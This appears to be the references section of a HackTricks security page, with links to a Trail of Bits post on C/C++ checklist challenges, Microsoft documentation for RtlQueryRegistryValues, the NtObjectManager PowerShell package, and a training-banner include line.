- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)

{{#include ../../banners/hacktricks-training.md}}
